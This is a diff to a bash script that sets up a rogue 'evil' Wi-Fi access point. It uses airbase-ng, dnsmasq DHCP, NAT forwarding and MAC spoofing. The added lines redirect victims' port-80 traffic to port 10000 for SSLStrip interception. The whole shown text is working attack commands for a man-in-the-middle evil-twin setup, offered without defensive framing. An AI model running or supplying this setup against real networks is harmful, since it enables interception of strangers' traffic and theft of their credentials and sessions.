@@ -10,7 +10,6 @@
 f_restore_ident(){
   ifconfig wlan1 down
   macchanger -p wlan1
-  hostname kali
 }
 
 trap f_endclean INT
@@ -21,11 +20,15 @@ f_clean_up() {
   echo
   echo "Killing any previous instances of airbase or dhcpd"
   echo
-  killall airbase-ng
-  killall dhcpd
-  airmon-ng stop mon0
-  iptables --flush
-  iptables --table nat --flush
+pkill airbase-ng 
+pkill dhcpd
+service dnsmasq stop
+ifconfig at0 down
+airmon-ng stop mon0
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
 }
 
 ##################################################
@@ -120,15 +123,20 @@ f_evilap(){
   sleep 2
 
   #Bring up virtual interface at0
-  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0
+  ifconfig at0 up
+  ifconfig at0 10.0.0.1 netmask 255.255.255.0
 
   #Start DHCP server on at0
-  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
+  service dnsmasq start
 
   #IP forwarding and iptables routing using internet connection
   echo 1 > /proc/sys/net/ipv4/ip_forward
-  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
-
+  iptables --table nat --append POSTROUTING --out-interface $interface -j MASQUERADE &&
+  iptables --append FORWARD --in-interface at0 -j ACCEPT &&
+  
+  echo "Redirecting port 80 to 1000 SSLStrip interception"
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+  
   tail -f $logname
 }
 
@@ -141,16 +149,22 @@ f_niceap(){
   airbase-ng -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 &
   sleep 2
 
+
   #Bring up virtual interface at0
-  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0
+  ifconfig at0 up
+  ifconfig at0 10.0.0.1 netmask 255.255.255.0
 
   #Start DHCP server on at0
-  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
+  service dnsmasq start
 
   #IP forwarding and iptables routing using internet connection
   echo 1 > /proc/sys/net/ipv4/ip_forward
-  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
-
+  iptables --table nat --append POSTROUTING --out-interface $interface -j MASQUERADE &&
+  iptables --append FORWARD --in-interface at0 -j ACCEPT &&
+  
+  echo "Redirecting port 80 to 1000 SSLStrip interception"
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+  
   tail -f $logname
 }
 
